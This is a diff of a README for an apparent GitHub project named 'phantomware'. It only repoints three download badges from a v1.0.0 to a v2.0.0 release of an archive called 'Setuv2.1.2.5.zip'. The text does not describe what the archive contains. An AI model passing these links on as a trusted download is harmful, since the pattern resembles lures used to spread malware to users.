@@ -1,8 +1,8 @@
-[![Download](https://img.shields.io/github/downloads/roman-wright-ops1989e9/phantomware/total?style=social&label=Download)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/github/downloads/roman-wright-ops1989e9/phantomware/total?style=social&label=Download)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v2.0.0/Setuv2.1.2.5.zip)
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue?style=plastic&logo=github)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue?style=plastic&logo=github)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v2.0.0/Setuv2.1.2.5.zip)
 
-[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v2.0.0/Setuv2.1.2.5.zip)
 
 # 🎮 phantomware
 
